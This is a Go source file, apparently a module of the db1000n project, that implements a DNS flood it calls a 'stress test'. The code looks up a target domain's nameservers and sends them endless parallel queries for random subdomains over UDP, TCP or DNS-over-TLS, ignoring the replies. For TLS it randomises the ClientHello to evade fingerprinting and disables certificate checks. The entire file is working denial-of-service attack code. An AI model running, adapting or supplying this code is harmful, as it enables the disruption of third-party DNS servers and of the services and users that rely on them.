package dnsblast

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/miekg/dns"
	utls "github.com/refraction-networking/utls"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
)

const (
	UDPProtoName    = "udp"
	TCPProtoName    = "tcp"
	TCPTLSProtoName = "tcp-tls"
)

// Config contains all the necessary configuration for dns-blast
type Config struct {
	RootDomain      string
	Protocol        string        // "udp", "tcp", "tcp-tls"
	SeedDomains     []string      // Used to generate domain names using the Distinct Heavy Hitter algorithm
	Delay           time.Duration // The delay between two packets to send
	ParallelQueries int
	ClientID        string
}

// Start starts the job based on provided configuration
func Start(ctx context.Context, config *Config, wg *sync.WaitGroup, a *metrics.Accumulator, logger *zap.Logger) error {
	defer utils.PanicHandler(logger)

	logger.Debug("igniting the blaster",
		zap.String("rootDomain", config.RootDomain),
		zap.String("proto", config.Protocol),
		zap.Strings("seeds", config.SeedDomains),
		zap.Duration("delay", config.Delay),
		zap.Int("parallelQueries", config.ParallelQueries))

	nameservers, err := getNameservers(config.RootDomain, config.Protocol)
	if err != nil {
		metrics.IncDNSBlast(config.RootDomain, "", config.Protocol, metrics.StatusFail)

		return fmt.Errorf("failed to resolve nameservers for the root domain [rootDomain=%s]: %w",
			config.RootDomain, err)
	}

	logger.Debug("nameservers resolved for the root domain", zap.String("rootDomain", config.RootDomain), zap.Strings("nameservers", nameservers))

	stressTestParameters := &stressTestParameters{
		Delay:           config.Delay,
		Protocol:        config.Protocol,
		SeedDomains:     config.SeedDomains,
		ParallelQueries: config.ParallelQueries,
	}

	for _, nameserver := range nameservers {
		if wg != nil {
			wg.Add(1)
		}

		go func(nameserver string, a *metrics.Accumulator) {
			if wg != nil {
				defer wg.Done()
			}

			defer utils.PanicHandler(logger)

			executeStressTest(ctx, nameserver, stressTestParameters, config.ClientID, a, logger)
		}(nameserver, a.Clone(uuid.NewString())) // metrics.Accumulator is not safe for concurrent use, so let's make a new one
	}

	return nil
}

// stressTestParameters contains parameters for a single stress test
type stressTestParameters struct {
	Delay           time.Duration
	ParallelQueries int
	Protocol        string
	SeedDomains     []string
}

// executeStressTest executes a stress test based on parameters
func executeStressTest(ctx context.Context, nameserver string, parameters *stressTestParameters, clientID string, a *metrics.Accumulator, logger *zap.Logger) {
	defer utils.PanicHandler(logger)

	sharedDNSClient := newDefaultDNSClient(parameters.Protocol)
	reusableQuery := &QueryParameters{
		HostAndPort: nameserver,
		QName:       "", // To be generated on each cycle
		QType:       dns.TypeA,
	}

	nextLoopTicker := time.NewTicker(parameters.Delay)
	defer nextLoopTicker.Stop()

	for {
		reusableQuery.QName = randomSubdomain(parameters.SeedDomains)

		var wg sync.WaitGroup

		wg.Add(parameters.ParallelQueries)

		for i := 0; i < parameters.ParallelQueries; i++ {
			go func() {
				defer utils.PanicHandler(logger)
				simpleQueryWithNoResponse(sharedDNSClient, reusableQuery, clientID, logger)
				wg.Done()
			}()
		}

		wg.Wait()

		select {
		case <-ctx.Done():
			logger.Debug("DNS stress canceled", zap.String("server", reusableQuery.HostAndPort))

			return
		case <-nextLoopTicker.C:
		}
	}
}

//nolint:gosec // Cryptographically secure random not required
func randomSubdomain(rootDomains []string) string {
	const (
		subdomainMinLength   = 3
		subdomainMaxLength   = 64
		randomizerDictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	)

	b := make([]rune, subdomainMinLength+rand.Intn(subdomainMaxLength-subdomainMinLength))
	for i := range b {
		b[i] = []rune(randomizerDictionary)[rand.Intn(len(randomizerDictionary))]
	}

	return string(b) + "." + rootDomains[rand.Intn(len(rootDomains))] + "."
}

// QueryParameters contains parameters of a single dns query
type QueryParameters struct {
	HostAndPort string
	QName       string
	QType       uint16
}

// Response is a dns response struct
type Response struct {
	WithErr bool
	Err     error
	Latency time.Duration
}

// simpleQueryWithNoResponse is like SimpleQuery but with optimizations enabled by not needing a response
func simpleQueryWithNoResponse(sharedDNSClient *dns.Client, parameters *QueryParameters, clientID string, logger *zap.Logger) {
	question := new(dns.Msg).SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
	seedDomain := getSeedDomain(parameters.QName)

	conn, err := sharedDNSClient.Dial(parameters.HostAndPort)
	if err != nil {
		logger.Debug("failed to dial remote host to do the DNS query", zap.String("host", parameters.HostAndPort), zap.Error(err))
		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)

		return
	}

	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
	if sharedDNSClient.Net == TCPTLSProtoName {
		conn.Conn = utls.UClient(conn, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
	}

	defer conn.Close()

	_, _, err = sharedDNSClient.ExchangeWithConn(question, conn)
	if err != nil {
		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)
		logger.Debug("failed to complete the DNS query", zap.Error(err))

		return
	}

	metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusSuccess)
}

func newDefaultDNSClient(proto string) *dns.Client {
	const (
		dialTimeout  = 1 * time.Second        // Let's not wait long if the server cannot be dialled, we all know why
		writeTimeout = 500 * time.Millisecond // Longer write timeout than read timeout just to make sure the query is uploaded
		readTimeout  = 300 * time.Millisecond // Not really interested in reading responses
	)

	c := &dns.Client{
		Dialer: &net.Dialer{
			Timeout: dialTimeout,
		},
		DialTimeout:  dialTimeout,
		WriteTimeout: writeTimeout,
		ReadTimeout:  readTimeout,
		Net:          proto,
	}

	if c.Net == TCPTLSProtoName {
		c.TLSConfig = &tls.Config{
			InsecureSkipVerify: true, //nolint:gosec // This is intentional
		}
	}

	return c
}

func getNameservers(rootDomain string, protocol string) (res []string, err error) {
	const (
		defaultDNSPort        = 53
		defaultDNSOverTLSPort = 853
	)

	port := defaultDNSPort
	if protocol == TCPTLSProtoName {
		port = defaultDNSOverTLSPort
	}

	nameservers, err := net.LookupNS(rootDomain)
	if err != nil {
		return nil, err
	}

	for _, nameserver := range nameservers {
		res = append(res, net.JoinHostPort(nameserver.Host, strconv.Itoa(port)))
	}

	return res, nil
}

// getSeedDomain cut last subdomain part and root domain "." (dot). From <value>="test.example.com." returns "example.com"
func getSeedDomain(value string) string {
	// -1 to remove "." (dot) at end
	return value[strings.Index(value, ".")+1 : len(value)-1]
}
